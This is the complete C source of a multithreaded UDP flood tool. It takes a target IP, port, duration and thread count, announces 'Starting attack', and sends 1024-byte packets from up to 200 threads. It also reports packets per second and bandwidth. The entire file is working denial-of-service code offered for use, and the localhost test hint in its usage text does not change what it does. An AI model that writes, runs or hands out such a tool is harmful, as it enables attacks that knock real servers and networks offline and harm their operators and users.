#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <unistd.h>
#include <pthread.h>
#include <time.h>
#include <signal.h>
#include <errno.h>
#include <sys/time.h>
#include <fcntl.h>

#define BUFFER_SIZE 1024
#define MAX_THREADS 200
#define STATS_INTERVAL 2

typedef struct {
    char ip[16];
    int port;
    int duration;
    int thread_id;
} flood_args_t;

volatile sig_atomic_t keep_running = 1;
volatile long global_packets = 0;
volatile long global_bytes = 0;
time_t global_start_time;

void handle_signal(int sig) {
    keep_running = 0;
    printf("\nShutting down...\n");
}

void *stats_thread(void *arg) {
    time_t last_time = time(NULL);
    long last_packets = 0;
    
    while (keep_running) {
        sleep(STATS_INTERVAL);
        
        time_t current_time = time(NULL);
        long current_packets = global_packets;
        long interval_packets = current_packets - last_packets;
        double interval_seconds = difftime(current_time, last_time);
        
        if (interval_seconds > 0) {
            double pps = interval_packets / interval_seconds;
            printf("[STATS] PPS: %.0f | Total: %ld packets | Time: %lds\n", 
                   pps, current_packets, (current_time - global_start_time));
        }
        
        last_packets = current_packets;
        last_time = current_time;
    }
    return NULL;
}

void *udp_flood(void *args) {
    flood_args_t *flood_args = (flood_args_t *)args;
    const char *ip = flood_args->ip;
    int port = flood_args->port;
    int duration = flood_args->duration;
    int thread_id = flood_args->thread_id;
    
    // Create UDP socket
    int sock = socket(AF_INET, SOCK_DGRAM, 0);
    if (sock < 0) {
        perror("Socket creation failed");
        free(args);
        return NULL;
    }

    // Set socket to non-blocking
    int flags = fcntl(sock, F_GETFL, 0);
    fcntl(sock, F_SETFL, flags | O_NONBLOCK);

    // Increase send buffer size
    int sendbuf = 1024 * 1024;  // 1MB buffer
    setsockopt(sock, SOL_SOCKET, SO_SNDBUF, &sendbuf, sizeof(sendbuf));

    // Setup target address
    struct sockaddr_in target;
    memset(&target, 0, sizeof(target));
    target.sin_family = AF_INET;
    target.sin_port = htons(port);
    
    if (inet_pton(AF_INET, ip, &target.sin_addr) <= 0) {
        perror("Invalid address");
        close(sock);
        free(args);
        return NULL;
    }

    // Create buffer with some data
    char buffer[BUFFER_SIZE];
    memset(buffer, 'X', BUFFER_SIZE);  // Fill with data
    
    time_t start_time = time(NULL);
    time_t end_time = start_time + duration;
    long thread_packets = 0;
    int error_count = 0;

    printf("Thread %d started - Target: %s:%d\n", thread_id, ip, port);
    
    // Main flood loop
    while (keep_running && time(NULL) < end_time) {
        ssize_t sent = sendto(sock, buffer, BUFFER_SIZE, 0,
                             (struct sockaddr *)&target, sizeof(target));
        
        if (sent > 0) {
            thread_packets++;
            __sync_fetch_and_add(&global_packets, 1);
            __sync_fetch_and_add(&global_bytes, sent);
        } else {
            // Handle errors - brief pause if buffer is full
            if (errno == ENOBUFS || errno == EAGAIN) {
                usleep(100);  // 100 microsecond delay
                error_count++;
                if (error_count > 1000) {
                    usleep(1000);  // Longer delay if persistent errors
                }
            }
        }
    }

    close(sock);
    printf("Thread %d finished - Packets: %ld\n", thread_id, thread_packets);
    free(args);
    return NULL;
}

void print_banner() {
    printf("\n");
    printf("╔══════════════════════════════════════╗\n");
    printf("║         REAL UDP FLOOD TOOL         ║\n");
    printf("║         [ACTUAL TRAFFIC]            ║\n");
    printf("╚══════════════════════════════════════╝\n");
    printf("\n");
}

// Function to verify target is reachable
int verify_target(const char *ip, int port) {
    int sock = socket(AF_INET, SOCK_DGRAM, 0);
    if (sock < 0) return 0;
    
    struct sockaddr_in target;
    target.sin_family = AF_INET;
    target.sin_port = htons(port);
    inet_pton(AF_INET, ip, &target.sin_addr);
    
    // Try to connect (won't actually establish connection for UDP)
    int result = connect(sock, (struct sockaddr *)&target, sizeof(target));
    close(sock);
    
    return (result == 0);
}

int main(int argc, char *argv[]) {
    if (argc != 5) {
        printf("Usage: %s <IP> <PORT> <DURATION> <THREADS>\n", argv[0]);
        printf("Example: %s 192.168.1.1 80 60 10\n", argv[0]);
        printf("Test with: %s 127.0.0.1 9999 10 5 (localhost test)\n", argv[0]);
        exit(EXIT_FAILURE);
    }

    print_banner();
    
    signal(SIGINT, handle_signal);
    signal(SIGTERM, handle_signal);

    const char *ip = argv[1];
    int port = atoi(argv[2]);
    int duration = atoi(argv[3]);
    int num_threads = atoi(argv[4]);

    if (num_threads > MAX_THREADS) {
        printf("Warning: Limiting threads to %d\n", MAX_THREADS);
        num_threads = MAX_THREADS;
    }

    printf("[INFO] Target: %s:%d\n", ip, port);
    printf("[INFO] Duration: %d seconds\n", duration);
    printf("[INFO] Threads: %d\n", num_threads);
    printf("[INFO] Packet size: %d bytes\n", BUFFER_SIZE);
    
    // Verify target (basic check)
    if (!verify_target(ip, port)) {
        printf("[WARNING] Target verification failed - continuing anyway\n");
    }

    printf("[INFO] Starting attack in 3 seconds...\n");
    sleep(3);

    global_start_time = time(NULL);
    pthread_t threads[MAX_THREADS];
    pthread_t stats_thr;

    // Start statistics thread
    if (pthread_create(&stats_thr, NULL, stats_thread, NULL) != 0) {
        perror("Could not create stats thread");
        exit(EXIT_FAILURE);
    }

    // Create flood threads
    int threads_created = 0;
    for (int i = 0; i < num_threads; i++) {
        flood_args_t *args = malloc(sizeof(flood_args_t));
        if (!args) {
            perror("Memory allocation failed");
            continue;
        }
        
        strncpy(args->ip, ip, sizeof(args->ip) - 1);
        args->port = port;
        args->duration = duration;
        args->thread_id = i + 1;

        if (pthread_create(&threads[i], NULL, udp_flood, (void *)args) == 0) {
            threads_created++;
        } else {
            perror("Could not create thread");
            free(args);
        }
        
        // Small delay between thread creation
        usleep(10000); // 10ms
    }

    printf("[INFO] Created %d flood threads\n", threads_created);
    printf("[INFO] Generating REAL traffic to %s:%d\n", ip, port);
    
    // Wait for all threads to complete
    for (int i = 0; i < threads_created; i++) {
        pthread_join(threads[i], NULL);
    }

    keep_running = 0;
    pthread_join(stats_thr, NULL);

    // Final statistics
    time_t total_time = time(NULL) - global_start_time;
    if (total_time == 0) total_time = 1;
    double avg_pps = (double)global_packets / total_time;
    double total_mb = (double)global_bytes / (1024 * 1024);
    double avg_mbps = (total_mb * 8) / total_time;
    
    printf("\n╔══════════════════════════════════════╗\n");
    printf("║             FINAL STATS             ║\n");
    printf("╠══════════════════════════════════════╣\n");
    printf("║ Total Packets: %-20ld ║\n", global_packets);
    printf("║ Total Data:    %-8.2f MB       ║\n", total_mb);
    printf("║ Duration:      %-8ld seconds  ║\n", total_time);
    printf("║ Average PPS:   %-8.0f         ║\n", avg_pps);
    printf("║ Average Mbps:  %-8.2f         ║\n", avg_mbps);
    printf("╚══════════════════════════════════════╝\n");

    return 0;
}
